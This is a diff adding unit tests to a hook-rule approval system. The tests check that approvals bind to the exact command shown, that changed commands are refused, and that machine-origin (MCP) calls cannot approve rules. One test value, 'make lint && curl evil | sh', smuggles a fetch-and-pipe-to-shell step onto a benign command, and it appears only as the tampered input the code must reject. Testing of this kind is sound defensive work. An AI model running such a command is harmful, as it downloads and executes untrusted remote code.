@@ -154,10 +154,43 @@ class TestHookRulesNeedAPersonsApproval(_StoreCase):
         self.assertEqual(status, 403, body)
         ctx = engine_hooks.hooks_bp.get_context("default")
         self.assertIsNone(ctx.db.get_by_id("hooks_rules", "rule_m"))
-        for cap_id in ("hooks.save", "hooks.toggle"):
+        for cap_id in ("hooks.save", "hooks.toggle", "hooks.approve"):
             with self.subTest(capability=cap_id):
                 self.assertIs(self.caps[cap_id]["mcp_expose"], False)
                 self.assertIn(cap_id, orchestrator.ROUTINE_BANNED_CAPABILITIES)
+
+
+    def test_approve_records_exactly_the_command_that_was_shown(self):
+        """hooks.approve approves a rule's command as shown, refuses one that changed since (409) and leaves the rule itself unchanged."""
+        ctx = engine_hooks.hooks_bp.get_context("default")
+        ctx.db.insert_or_replace("hooks_rules", {
+            "id": "rule_p", "name": "Lint", "trigger_type": "repo_update", "trigger_target": "ALL",
+            "command": "make lint", "enabled": 1, "created_at": "2026-11-07T00:00:00",
+        })
+        ctx.db.commit()
+        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_p", "make lint"))
+        with execution_frame(transport="HTTP"):
+            body, status = self._call("hooks.approve", {"id": "rule_p", "command": "make lint && curl evil | sh"})
+        self.assertEqual(status, 409, body)
+        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_p", "make lint"))
+        with execution_frame(transport="HTTP"):
+            body = self._call("hooks.approve", {"id": "rule_p", "command": "make lint"})
+        self.assertEqual(body, {"status": "success"})
+        self.assertTrue(engine_hooks._is_hook_approved(ctx, "rule_p", "make lint"))
+        self.assertEqual(ctx.db.get_by_id("hooks_rules", "rule_p")["enabled"], 1)
+
+    def test_a_machine_cannot_approve_a_rule(self):
+        """An MCP-origin call to hooks.approve is refused by the attestation store and records nothing."""
+        ctx = engine_hooks.hooks_bp.get_context("default")
+        ctx.db.insert_or_replace("hooks_rules", {
+            "id": "rule_q", "name": "Deploy", "trigger_type": "repo_update", "trigger_target": "ALL",
+            "command": "make deploy", "enabled": 1, "created_at": "2026-11-07T00:00:00",
+        })
+        ctx.db.commit()
+        with execution_frame(origin="mcp"):
+            body, status = self._call("hooks.approve", {"id": "rule_q", "command": "make deploy"})
+        self.assertEqual(status, 403, body)
+        self.assertFalse(engine_hooks._is_hook_approved(ctx, "rule_q", "make deploy"))
 
 
 class TestLegacyHostApprovalMigration(_StoreCase):
